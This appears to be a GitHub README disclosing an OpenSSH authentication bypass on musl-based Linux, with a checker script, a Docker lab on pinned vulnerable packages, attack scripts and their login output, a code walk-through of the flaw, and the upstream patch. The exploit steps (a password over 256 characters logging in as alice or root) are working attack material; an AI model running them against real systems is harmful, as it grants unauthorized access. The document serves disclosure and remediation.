<p align="center"><a href="https://sshhole.com"><img src="assets/logo.png" alt="*sshole" width="480"></a></p>

openssh on musl linux (alpine, openwrt, buildroot, yocto) lets you log in to any account that has `*` as its password with any password longer than 256 characters. that means root, key-only users, ldap users, the `alpine` user on alpine's cloud images. since 2016.

the full story is at [sshhole.com](https://sshhole.com). this repo has the script to check your own machine, a docker setup to try it yourself, and the patch.

fixed in openssh 10.6p2 on 2026-11-05. alpine packages are out.

## am i an \*sshole?

```
curl -sO https://raw.githubusercontent.com/oz9un/sshole/main/check.sh
sudo sh check.sh
```

```
libc                         musl
sshd                         OpenSSH_10.3p1, OpenSSL 3.5.9 29 Sep 2026
pam                          off (not built in)
PasswordAuthentication       yes
accounts with '*'            root alice deploy
sha-crypt hash present       yes (bob)

EXPOSED. anyone can log in as: root alice deploy
fix: apk upgrade openssh (10.6p2), or set PasswordAuthentication no until you can.
```

you are only exposed if all of these are true. the script tells you which one is missing if you're not:

- the system uses musl (alpine, openwrt, buildroot, yocto, postmarketos, void-musl, chimera)
- sshd is built without pam. alpine's normal `openssh-server` package is. `openssh-server-pam` with `UsePAM yes` is safe
- `PasswordAuthentication yes` in sshd_config (this is the default)
- at least one account has exactly `*` as its password field
- at least one account has a real `$5$` or `$6$` password hash (someone, anyone, ran `passwd`)

glibc, pam, `PasswordAuthentication no`, openbsd, freebsd, macos: not affected. you can stop reading.

## reproduce it

you need docker or podman. this checkout defaults to `alpine:latest` (override `BASE` to test another musl-based Alpine image), but deliberately installs Alpine's official pre-fix `openssh` `10.3_p1-r1` APKs by URL and SHA-256. It otherwise uses the stock server and default config; Alpine documents the relevant defaults and fixed package versions in its [security advisory](https://alpinelinux.org/posts/2026-11-05-openssh-password-authentication-bypass/). `alice` has `*`, `bob` has a real password. The vulnerable behavior comes from the pinned OpenSSH packages: a normal `apk add openssh-server` uses the live Alpine package index and selects the fixed package instead.

`poc/repro.sh` builds and runs it for you (`PermitRootLogin yes` is already set, so both `alice` and `root` work without rerunning anything): it force-kills any old/unrelated container already bound to port 2222 regardless of its name, rebuilds on `linux/amd64` (needed on arm64 hosts — see below), and verifies the running container is actually `openssh-server-10.3_p1-r1` before you trust an attack result against it.

```
cd poc
./repro.sh
./attack.sh 127.0.0.1 2222 alice
```

```
Permission denied, please try again.
uid=1000(alice) gid=1000(alice) groups=1000(alice)
RESULT: logged in as alice
```

two prompts. first one anything, second one 300 x `A`. that's the exploit.

```
./attack.sh 127.0.0.1 2222 root
```

`attack.py` does the same with paramiko and lets you pick the password length, so you can see 256 fail and 257 work:

```
pip install paramiko
python3 attack.py 127.0.0.1 2222 alice 256     # rejected
python3 attack.py 127.0.0.1 2222 alice 257     # logged in
```

for older alpine versions: `BASE=alpine:3.21 ./repro.sh`. it works at least back to 3.18. the oldest we tried was openssh 7.5p1 on musl 1.1.16 from 2017, and it worked there too.

on an arm64 host (e.g. Apple Silicon): `repro.sh` already forces `--platform=linux/amd64` for you. doing it manually instead of via the script, a plain `docker build`/`podman build` would pull an aarch64 base whose musl can't satisfy these pinned x86_64 packages, and `apk add` fails as uninstallable.

## patch

[`patch/4353fdc43-avoid-password-authn-bypass.patch`](patch/4353fdc43-avoid-password-authn-bypass.patch) is the upstream fix, unchanged, in case you need to apply it to an older version. The authoritative upstream source is OpenSSH commit [`4353fdc43ef646c43a8dda7025cc1a898caf1482`](https://github.com/openssh/openssh-portable/commit/4353fdc43ef646c43a8dda7025cc1a898caf1482); Alpine's [security advisory](https://alpinelinux.org/posts/2026-11-05-openssh-password-authentication-bypass/) identifies the fixed package versions. It works on anything from 7.3p1 up. It makes sshd skip the comparison when the stored field is too short to be a real hash, and it also stops using a pointer into libc's static buffer.

if you can't update right now, set `PasswordAuthentication no` in `sshd_config`. that closes it completely.

## how it works, in six lines

```
pw_password = "*"                          # alice has no password
salt = NULL                                # "*" is too short to be a salt
salt = pick_salt()                         # so sshd takes bob's: "$6$abc$"
hash = crypt("AAAA…x300", "$6$abc$")       # musl: key is over 256 bytes -> returns "*"
strcmp(hash, pw_password) == 0             # "*" == "*"
return 1                                   # welcome, alice
```

sshd has compared against `*` like this since the 90s. musl started returning `*` on failure in 2012. sshd started using other accounts' salts in 2016. see the [timeline](TIMELINE.md).

## not here

the full test setup (17 environments: cloud image in qemu, openwrt, buildroot, ldap and ad users, and so on), the prevalence numbers and the per-distro table are in the write-up. they may be published later. this repo is small on purpose.

mit license.
